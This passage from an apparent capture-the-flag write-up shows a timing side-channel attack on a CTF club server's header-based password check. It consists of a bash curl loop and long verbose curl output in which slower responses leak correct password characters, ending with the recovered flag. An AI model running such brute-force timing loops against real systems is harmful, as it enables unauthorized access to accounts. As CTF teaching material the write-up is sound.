	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kW
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:28 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.10182956565154067* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kX
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:28 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6713470619421806* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kY
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:29 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.48192739215973557* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kZ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:29 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7032416484348676%  

And here we again find another match. The entry for password:ky is inordinately larger than the others. It does not take long now, and soon we get to this point.

	$ for i in kyouk{a..z} kyouk{A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouka
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:09 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8132909966860766* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukb
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:09 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5326328350737839* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukc
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:10 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5085076831337647* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukd
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:10 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.025226588434466457* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouke
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:10 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7811551411327506* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukf
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:11 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7480565290874939* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukg
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:11 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8855568737488066* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukh
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:12 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8525616648196916* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouki
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:12 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.15165426602922327* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukj
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:13 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7213225087953665* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukk
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:13 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6363398873096235* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukl
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:14 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5200273537736508* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukm
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:14 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.758550180101923* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukn
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:14 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.13992585055199513* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouko
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:15 GMT
	< Content-Length: 12
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	flag: kyouko* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukp
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5005919527830356* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukq
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:16 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.715336049529447* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukr
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:16 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3652646080131514* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouks
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:17 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3447265839363751* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukt
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:17 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6709750855299004* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouku
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:17 GMT
	< Content-Length: 28
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.23380826177129* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukv
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:18 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.633749253679849* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukw
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:18 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6255947692132287* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukx
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:19 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9531687170381868* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouky
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:19 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.791846372652302* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukz
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:20 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4836065003940342* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukA
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:20 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.025242487463419616* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukB
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:21 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9859911039278737* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukC
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:22 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3624027977851678* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukD
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:22 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.21105498455679794* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukE
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:22 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.38746328822346254* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukF
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6507595826560217* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukG
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9591291051042148* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukH
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:24 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.15819150866895915* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukI
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:24 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8884720214317476* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukJ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:25 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.14722283970686934* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukK
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:25 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.24712537095285825* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukL
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:25 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.10619030901648752* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukM
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:26 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3493685089328282* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukN
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:26 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8423575328498458* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukO
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3633254832541284* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukP
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9789410241559267* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukQ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:28 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7396645997963649* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukR
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:28 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.20661399796140212* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukS
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:29 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6656207422036426* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukT
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:29 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5410787421371817* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukU
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:30 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.277118993985084* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukV
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:30 GMT
